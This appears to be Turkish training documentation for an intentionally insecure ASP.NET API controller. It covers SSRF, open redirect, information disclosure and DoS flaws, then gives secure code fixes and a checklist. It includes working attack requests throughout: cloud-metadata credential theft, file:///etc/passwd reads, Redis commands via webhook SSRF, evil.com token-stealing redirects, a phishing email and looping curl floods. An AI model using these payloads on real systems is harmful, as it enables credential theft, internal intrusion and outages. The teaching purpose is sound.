# UtilityController Güvenlik Açýklarý Dokümantasyonu

## ?? Genel Bakýþ

Bu controller, OWASP API Security Top 10 2023 listesindeki çeþitli güvenlik açýklarýný içeren **kasýtlý olarak güvensiz** bir endpoint koleksiyonudur. Eðitim ve test amaçlýdýr.

**?? UYARI: Bu kodu production ortamýnda ASLA kullanmayýn!**

---

## ?? Kritik Güvenlik Açýklarý

### 1. Server-Side Request Forgery (SSRF) - API7:2023

#### Etkilenen Endpoint'ler:
- `GET /api/utility/fetch-image`
- `POST /api/utility/webhook`
- `GET /api/utility/proxy`

#### Açýklama:
Controller, kullanýcý tarafýndan saðlanan URL'leri doðrulamadan HTTP istekleri yapmaktadýr.

#### Güvenlik Riskleri:

**a) Ýç Að Kaynaklarýna Eriþim:**
```http
GET /api/utility/fetch-image?url=http://localhost:5000/admin
GET /api/utility/proxy?target=http://192.168.1.100:8080/internal-api
```

**b) Port Tarama:**
```http
GET /api/utility/fetch-image?url=http://192.168.1.1:22
GET /api/utility/fetch-image?url=http://192.168.1.1:3306
```

**c) Cloud Metadata Eriþimi:**
```http
GET /api/utility/fetch-image?url=http://169.254.169.254/latest/meta-data/
GET /api/utility/fetch-image?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

**d) Lokal Dosya Okuma:**
```http
GET /api/utility/fetch-image?url=file:///etc/passwd
GET /api/utility/fetch-image?url=file:///C:/Windows/System32/drivers/etc/hosts
```

**e) Webhook Üzerinden SSRF:**
```http
POST /api/utility/webhook?webhookUrl=http://localhost:6379/
Content-Type: application/json

{
  "command": "CONFIG GET *"
}
```

#### Etki:
- Ýç að kaynaklarýnýn keþfi
- Hassas metadata bilgilerine eriþim (AWS, Azure credentials)
- Ýç servislere saldýrý (Redis, MongoDB, vb.)
- Port tarama ve að keþfi
- Güvenlik duvarý bypass
- Yerel dosya sistemine eriþim

---

### 2. Open Redirect - CWE-601

#### Etkilenen Endpoint:
- `GET /api/utility/redirect`

#### Açýklama:
Endpoint, hedef URL'yi doðrulamadan redirect iþlemi yapmaktadýr.

#### Saldýrý Örnekleri:

**a) Phishing Saldýrýsý:**
```http
GET /api/utility/redirect?targetUrl=https://evil-site.com/fake-login
```

**b) Güvenilir Domain'den Kötü Niyetli Siteye Yönlendirme:**
```http
GET /api/utility/redirect?targetUrl=https://attacker.com/malware
```

**c) OAuth/SAML Bypass:**
```http
GET /api/utility/redirect?targetUrl=https://evil.com?token={STOLEN_TOKEN}
```

#### Etki:
- Phishing kampanyalarýnda kullaným
- Güvenilir domain'in kötüye kullanýmý
- OAuth/SAML token hýrsýzlýðý
- Kötü amaçlý yazýlým daðýtýmý
- Kullanýcý güveninin istismarý

---

### 3. Information Disclosure - API8:2023

#### Etkilenen Endpoint'ler:
- `GET /api/utility/health`
- Tüm endpoint'lerdeki hata mesajlarý

#### Açýklama:
Sistem aþýrý miktarda hassas bilgi ifþa etmektedir.

#### Health Endpoint Bilgi Ýfþasý:

```http
GET /api/utility/health
```

**Dönen Hassas Bilgiler:**
```json
{
  "status": "healthy",
  "version": "1.0.0-VULNERABLE",
  "environment": "Development",
  "machineName": "PROD-SERVER-01",
  "osVersion": "Microsoft Windows NT 10.0.17763.0",
  "processorCount": 8,
  "dotnetVersion": "8.0.0",
  "workingSet": 52428800,
  "currentDirectory": "C:\\Apps\\VulnerableAPI",
  "timestamp": "2024-01-15T10:30:00Z"
}
```

#### Hata Mesajlarýnda Bilgi Ýfþasý:

**Örnek 1 - Stack Trace Ýfþasý:**
```http
GET /api/utility/fetch-image?url=invalid-url
```

```json
{
  "message": "Error fetching resource",
  "error": "The requested URI is invalid",
  "stackTrace": "at System.Net.Http.HttpClient.GetAsync(...)\n at VulnerableAPI.Controllers.UtilityController.FetchImage(...)",
  "url": "invalid-url",
  "innerException": "Invalid URI scheme"
}
```

**Örnek 2 - Proxy Hatasý:**
```http
GET /api/utility/proxy?target=http://non-existent-server:9999
```

```json
{
  "message": "Proxy request failed",
  "error": "Connection refused",
  "stackTrace": "Full .NET stack trace exposed...",
  "target": "http://non-existent-server:9999"
}
```

#### Ýfþa Edilen Bilgiler:
- Sunucu adý ve hostname
- Ýþletim sistemi versiyonu
- .NET runtime versiyonu
- Uygulama dizin yapýsý
- Ortam bilgisi (Development/Production)
- Donaným özellikleri
- Stack trace ve dahili kod yapýsý
- Ýç servis URL'leri
- Exception detaylarý

#### Etki:
- Saldýrganlar sistem hakkýnda istihbarat toplar
- Hedefli saldýrýlar için bilgi saðlar
- Güvenlik açýðý keþfi kolaylaþýr
- Versiyon bilgisi ile bilinen exploit'ler kullanýlabilir

---

### 4. Denial of Service (DoS) Açýklarý

#### a) HttpClient Timeout Eksikliði

**Güvenlik Açýðý:**
```csharp
public UtilityController(ILogger<UtilityController> logger, IHttpClientFactory httpClientFactory)
{
    _logger = logger;
    _httpClient = httpClientFactory.CreateClient();
    // VULNERABILITY: Not setting timeout, allowing potential DoS
}
```

**Saldýrý Senaryosu:**
```http
GET /api/utility/fetch-image?url=http://slowloris-attack.com/infinite-response
```

Saldýrgan, çok yavaþ yanýt veren veya hiç bitmeyen bir endpoint verir. Server kaynaklarý tükenir.

#### b) Büyük Dosya Ýndirme

**Saldýrý:**
```http
GET /api/utility/fetch-image?url=https://example.com/10GB-file.iso
```

**Etki:**
- Bellek tükenmesi
- Bandwidth tükenmesi
- Disk alaný doluþu
- Server yanýt vermemeye baþlar

#### c) Webhook Bombardýmaný

**Saldýrý:**
```bash
# 1000 paralel webhook isteði
for i in {1..1000}; do
  curl -X POST "http://vulnerable-api.com/api/utility/webhook?webhookUrl=http://slow-server.com/endpoint" \
       -H "Content-Type: application/json" \
     -d '{"data": "payload"}' &
done
```

---

### 5. Ýçerik Türü Doðrulama Eksikliði

#### Etkilenen Endpoint:
- `GET /api/utility/fetch-image`

#### Güvenlik Açýðý:
```csharp
var contentType = response.Content.Headers.ContentType?.ToString() ?? "application/octet-stream";
var content = await response.Content.ReadAsByteArrayAsync();

// VULNERABILITY: No content type validation
// Could return any file type, not just images
return File(content, contentType);
```

#### Saldýrý Örnekleri:

**a) Kötü Amaçlý Dosya Sunma:**
```http
GET /api/utility/fetch-image?url=https://attacker.com/malware.exe
```

Endpoint, executable dosyayý image olarak sunabilir.

**b) HTML Injection:**
```http
GET /api/utility/fetch-image?url=https://attacker.com/xss-payload.html
```

HTML içerik, image olarak döndürülür ve bazý client'larda execute edilebilir.

**c) XXE/XML Bombs:**
```http
GET /api/utility/fetch-image?url=https://attacker.com/xml-bomb.xml
```

#### Etki:
- Kötü amaçlý içerik daðýtýmý
- Client-side saldýrýlar
- Content type confusion saldýrýlarý
- Dosya tipine özgü exploit'ler

---

## ?? Saldýrý Senaryolarý

### Senaryo 1: Cloud Credentials Çalma

**Adým 1:** SSRF keþfi
```http
GET /api/utility/fetch-image?url=http://169.254.169.254/latest/meta-data/
```

**Adým 2:** IAM role çalma
```http
GET /api/utility/fetch-image?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/MyAppRole
```

**Sonuç:** AWS credentials ele geçirilir.

---

### Senaryo 2: Ýç Að Keþfi ve Saldýrý

**Adým 1:** Port tarama
```bash
for port in {1..65535}; do
  curl "http://vulnerable-api.com/api/utility/proxy?target=http://192.168.1.10:$port"
done
```

**Adým 2:** Bulunan servislere saldýrý
```http
POST /api/utility/webhook?webhookUrl=http://192.168.1.10:6379/
Content-Type: application/json

{
  "redis_command": "CONFIG SET dir /var/www/html/"
}
```

---

### Senaryo 3: Phishing Kampanyasý

**Email Ýçeriði:**
```
Sayýn Kullanýcý,

Hesabýnýzda þüpheli aktivite tespit edildi.
Lütfen aþaðýdaki linke týklayarak kimliðinizi doðrulayýn:

https://trusted-company.com/api/utility/redirect?targetUrl=https://evil-phishing-site.com/fake-login

Bu güvenilir alan adýmýz, ancak redirect ediyor...
```

---

### Senaryo 4: DoS Saldýrýsý

```bash
# Yavaþ yanýt veren endpoint
while true; do
  curl "http://vulnerable-api.com/api/utility/fetch-image?url=http://slowloris.com/infinite" &
  curl "http://vulnerable-api.com/api/utility/proxy?target=http://10gb-file.com/huge.iso" &
done
```

**Sonuç:** Server kaynaklarý tükenir, hizmet çöker.

---

## ??? Güvenli Kod Örnekleri

### 1. SSRF Korumasý

```csharp
public class SecureUtilityController : ControllerBase
{
    private readonly HttpClient _httpClient;
    private readonly IConfiguration _configuration;
    private static readonly HashSet<string> AllowedHosts = new()
    {
        "api.example.com",
        "cdn.example.com"
    };

    public SecureUtilityController(IHttpClientFactory httpClientFactory, IConfiguration configuration)
    {
        _httpClient = httpClientFactory.CreateClient();
_httpClient.Timeout = TimeSpan.FromSeconds(30);
    _configuration = configuration;
  }

    [HttpGet("fetch-image")]
    public async Task<IActionResult> FetchImage([FromQuery] string url)
    {
      // 1. URL validation
        if (!Uri.TryCreate(url, UriKind.Absolute, out var uri))
    {
        return BadRequest(new { message = "Invalid URL format" });
      }

        // 2. Scheme validation (only HTTPS)
      if (uri.Scheme != Uri.UriSchemeHttps)
   {
     return BadRequest(new { message = "Only HTTPS URLs are allowed" });
        }

        // 3. Host whitelist validation
 if (!AllowedHosts.Contains(uri.Host.ToLowerInvariant()))
  {
            return BadRequest(new { message = "Host not allowed" });
        }

    // 4. Private IP blocking
    if (IsPrivateOrLocalhost(uri))
      {
       return BadRequest(new { message = "Private IP addresses not allowed" });
      }

        // 5. DNS rebinding protection
        var ipAddresses = await Dns.GetHostAddressesAsync(uri.Host);
     if (ipAddresses.Any(ip => IsPrivateIP(ip)))
    {
return BadRequest(new { message = "DNS resolves to private IP" });
        }

        try
        {
        var response = await _httpClient.GetAsync(uri);
         
    if (!response.IsSuccessStatusCode)
            {
                return StatusCode((int)response.StatusCode);
    }

       // 6. Content type validation
      var contentType = response.Content.Headers.ContentType?.MediaType;
   var allowedTypes = new[] { "image/jpeg", "image/png", "image/gif", "image/webp" };
        
     if (!allowedTypes.Contains(contentType))
   {
    return BadRequest(new { message = "Invalid content type" });
         }

     // 7. Size limit
            var maxSize = 10 * 1024 * 1024; // 10MB
            if (response.Content.Headers.ContentLength > maxSize)
{
           return BadRequest(new { message = "File too large" });
            }

 var content = await response.Content.ReadAsByteArrayAsync();
          
  // 8. Image validation
    if (!IsValidImage(content))
      {
          return BadRequest(new { message = "Invalid image data" });
            }

      return File(content, contentType);
        }
        catch (HttpRequestException)
      {
 return StatusCode(500, new { message = "Failed to fetch resource" });
        }
        catch (TaskCanceledException)
        {
    return StatusCode(408, new { message = "Request timeout" });
        }
    }

    private static bool IsPrivateOrLocalhost(Uri uri)
    {
        var host = uri.Host.ToLowerInvariant();
        
     // Localhost check
        if (host == "localhost" || host == "127.0.0.1" || host == "::1")
            return true;

        // Private IP ranges
 if (IPAddress.TryParse(host, out var ip))
      {
       return IsPrivateIP(ip);
        }

        return false;
    }

    private static bool IsPrivateIP(IPAddress ip)
    {
        var bytes = ip.GetAddressBytes();
        
        // IPv4 private ranges
        if (ip.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)
{
            // 10.0.0.0/8
         if (bytes[0] == 10)
  return true;

            // 172.16.0.0/12
            if (bytes[0] == 172 && bytes[1] >= 16 && bytes[1] <= 31)
      return true;

            // 192.168.0.0/16
  if (bytes[0] == 192 && bytes[1] == 168)
                return true;

            // 169.254.0.0/16 (link-local)
     if (bytes[0] == 169 && bytes[1] == 254)
        return true;

            // 127.0.0.0/8 (loopback)
       if (bytes[0] == 127)
     return true;
        }

        return false;
    }

    private static bool IsValidImage(byte[] data)
    {
        if (data.Length < 4)
         return false;

      // Check magic numbers
// PNG: 89 50 4E 47
     if (data[0] == 0x89 && data[1] == 0x50 && data[2] == 0x4E && data[3] == 0x47)
    return true;

        // JPEG: FF D8 FF
 if (data[0] == 0xFF && data[1] == 0xD8 && data[2] == 0xFF)
       return true;

      // GIF: 47 49 46 38
        if (data[0] == 0x47 && data[1] == 0x49 && data[2] == 0x46 && data[3] == 0x38)
    return true;

   // WebP: 52 49 46 46
if (data[0] == 0x52 && data[1] == 0x49 && data[2] == 0x46 && data[3] == 0x46)
            return true;

return false;
    }
}
```

---

### 2. Open Redirect Korumasý

```csharp
[HttpGet("redirect")]
public IActionResult Redirect([FromQuery] string targetUrl)
{
    // 1. URL validation
    if (!Uri.TryCreate(targetUrl, UriKind.Absolute, out var uri))
    {
  return BadRequest(new { message = "Invalid URL" });
    }

  // 2. Same-origin policy
  var requestHost = Request.Host.Host.ToLowerInvariant();
    var targetHost = uri.Host.ToLowerInvariant();

    if (targetHost != requestHost)
  {
        return BadRequest(new { message = "External redirects not allowed" });
    }

    // 3. HTTPS enforcement
    if (uri.Scheme != Uri.UriSchemeHttps)
    {
    return BadRequest(new { message = "Only HTTPS redirects allowed" });
    }

    // 4. Path whitelist
    var allowedPaths = new[] { "/home", "/profile", "/dashboard" };
    if (!allowedPaths.Any(p => uri.AbsolutePath.StartsWith(p)))
{
        return BadRequest(new { message = "Redirect path not allowed" });
    }

    return Redirect(targetUrl);
}
```

---

### 3. Güvenli Health Endpoint

```csharp
[HttpGet("health")]
[ResponseCache(Duration = 60)]
public IActionResult Health()
{
    // Only return minimal information
    return Ok(new
    {
    status = "healthy",
        timestamp = DateTime.UtcNow
    });
}

// Detailed health check for authenticated admin users only
[HttpGet("health/detailed")]
[Authorize(Roles = "Admin")]
public IActionResult DetailedHealth()
{
    return Ok(new
    {
        status = "healthy",
        version = _configuration["App:Version"],
 environment = _configuration["App:Environment"],
        timestamp = DateTime.UtcNow,
        checks = new
        {
          database = CheckDatabase(),
 cache = CheckCache(),
            externalApi = CheckExternalApi()
        }
    });
}
```

---

### 4. Güvenli Hata Yönetimi

```csharp
public async Task<IActionResult> FetchImage([FromQuery] string url)
{
    try
    {
        // ... güvenli kod ...
    }
    catch (HttpRequestException ex)
    {
        // Log detailed error internally
        _logger.LogError(ex, "HTTP request failed for URL: {Url}", url);
      
        // Return generic error to client
      return StatusCode(500, new { message = "Failed to fetch resource" });
    }
    catch (TaskCanceledException ex)
    {
  _logger.LogWarning(ex, "Request timeout for URL: {Url}", url);
        return StatusCode(408, new { message = "Request timeout" });
    }
    catch (Exception ex)
    {
        // Log unexpected errors
        _logger.LogError(ex, "Unexpected error occurred");
        
      // Never expose internal details
        return StatusCode(500, new { message = "An error occurred" });
    }
}
```

---

### 5. HttpClient Konfigürasyonu

```csharp
// Program.cs veya Startup.cs
services.AddHttpClient("SecureClient", client =>
{
    client.Timeout = TimeSpan.FromSeconds(30);
    client.DefaultRequestHeaders.UserAgent.ParseAdd("MySecureApp/1.0");
  client.MaxResponseContentBufferSize = 10 * 1024 * 1024; // 10MB
})
.ConfigurePrimaryHttpMessageHandler(() => new SocketsHttpHandler
{
    PooledConnectionLifetime = TimeSpan.FromMinutes(2),
    MaxConnectionsPerServer = 10,
    ConnectTimeout = TimeSpan.FromSeconds(10)
})
.AddPolicyHandler(GetRetryPolicy())
.AddPolicyHandler(GetCircuitBreakerPolicy());

static IAsyncPolicy<HttpResponseMessage> GetRetryPolicy()
{
  return HttpPolicyExtensions
        .HandleTransientHttpError()
        .WaitAndRetryAsync(3, retryAttempt => 
            TimeSpan.FromSeconds(Math.Pow(2, retryAttempt)));
}

static IAsyncPolicy<HttpResponseMessage> GetCircuitBreakerPolicy()
{
    return HttpPolicyExtensions
        .HandleTransientHttpError()
        .CircuitBreakerAsync(5, TimeSpan.FromSeconds(30));
}
```

---

## ?? Güvenlik Kontrol Listesi

### SSRF Korumasý
- [ ] URL format validasyonu
- [ ] Scheme whitelist (sadece HTTPS)
- [ ] Host whitelist
- [ ] Private IP bloklama
- [ ] Localhost bloklama
- [ ] DNS rebinding korumasý
- [ ] Cloud metadata endpoint bloklama
- [ ] File:// protokol bloklama
- [ ] Timeout ayarlarý
- [ ] Size limitleri

### Redirect Korumasý
- [ ] URL validasyonu
- [ ] Same-origin policy
- [ ] Domain whitelist
- [ ] HTTPS enforcement
- [ ] Path whitelist
- [ ] Query string sanitization

### Information Disclosure Önleme
- [ ] Generic hata mesajlarý
- [ ] Stack trace gizleme
- [ ] Versiyon bilgisi gizleme
- [ ] Sistem bilgisi gizleme
- [ ] Detaylý logging (sadece sunucu tarafýnda)
- [ ] Debug mode devre dýþý (production)

### DoS Korumasý
- [ ] HttpClient timeout
- [ ] Request size limitleri
- [ ] Rate limiting
- [ ] Connection pooling
- [ ] Circuit breaker pattern
- [ ] Resource quotas

### Content Validation
- [ ] Content-type validation
- [ ] Magic number checking
- [ ] File size limits
- [ ] Malware scanning (production için)

---

## ?? Test Senaryolarý

### SSRF Test Komutlarý

```bash
# Local host eriþimi
curl "http://localhost:5000/api/utility/fetch-image?url=http://localhost:5000/admin"

# Private IP
curl "http://localhost:5000/api/utility/fetch-image?url=http://192.168.1.1"

# Cloud metadata
curl "http://localhost:5000/api/utility/fetch-image?url=http://169.254.169.254/latest/meta-data/"

# File protocol
curl "http://localhost:5000/api/utility/fetch-image?url=file:///etc/passwd"

# URL encoding bypass denemesi
curl "http://localhost:5000/api/utility/fetch-image?url=http://127.0.0.1@evil.com"

# DNS rebinding
curl "http://localhost:5000/api/utility/fetch-image?url=http://rebinding-attack.com"
```

### Open Redirect Test

```bash
# Dýþ site yönlendirmesi
curl -I "http://localhost:5000/api/utility/redirect?targetUrl=https://evil.com"

# Javascript protocol
curl -I "http://localhost:5000/api/utility/redirect?targetUrl=javascript:alert(1)"

# Data URL
curl -I "http://localhost:5000/api/utility/redirect?targetUrl=data:text/html,<script>alert(1)</script>"
```

### DoS Test

```bash
# Timeout testi
curl "http://localhost:5000/api/utility/fetch-image?url=http://httpbin.org/delay/300"

# Büyük dosya
curl "http://localhost:5000/api/utility/fetch-image?url=https://speed.hetzner.de/10GB.bin"

# Paralel istekler
seq 1 1000 | xargs -P 100 -I {} curl "http://localhost:5000/api/utility/proxy?target=http://httpbin.org/delay/10"
```

---

## ?? Referanslar

### OWASP
- [OWASP API Security Top 10 2023](https://owasp.org/www-project-api-security/)
- [API7:2023 Server Side Request Forgery](https://owasp.org/API-Security/editions/2023/en/0xa7-server-side-request-forgery/)
- [API8:2023 Security Misconfiguration](https://owasp.org/API-Security/editions/2023/en/0xa8-security-misconfiguration/)
- [SSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)
- [Unvalidated Redirects and Forwards](https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html)

### CWE
- [CWE-918: Server-Side Request Forgery (SSRF)](https://cwe.mitre.org/data/definitions/918.html)
- [CWE-601: Open Redirect](https://cwe.mitre.org/data/definitions/601.html)
- [CWE-200: Exposure of Sensitive Information](https://cwe.mitre.org/data/definitions/200.html)
- [CWE-400: Uncontrolled Resource Consumption](https://cwe.mitre.org/data/definitions/400.html)

### Microsoft Dokümantasyonu
- [HttpClient Security Best Practices](https://learn.microsoft.com/en-us/dotnet/fundamentals/networking/http/httpclient-guidelines)
- [ASP.NET Core Security](https://learn.microsoft.com/en-us/aspnet/core/security/)
- [Error Handling in ASP.NET Core](https://learn.microsoft.com/en-us/aspnet/core/fundamentals/error-handling)

### Güvenlik Araçlarý
- [SSRF Testing Tools](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery)
- [Burp Suite SSRF Scanner](https://portswigger.net/burp/documentation/scanner/vulnerabilities-list)

---

## ?? Sorumluluk Reddi

Bu kod, **sadece eðitim ve test amaçlýdýr**. Production ortamýnda kullanýlmasý:
- Veri ihlallerine
- Sistem ele geçirilmesine
- Ýç að saldýrýlarýna
- DoS saldýrýlarýna
- Yasal sorumluluklara

yol açabilir.

**Gerçek uygulamalarda yukarýdaki güvenli kod örneklerini kullanýn!**

---

## ?? Lisans

Bu doküman MIT lisansý altýnda sunulmaktadýr. Eðitim amaçlý kullaným için serbesttir.

---

**Son Güncelleme:** 2024
**Durum:** ?? GÜVENSIZ - Eðitim Amaçlý
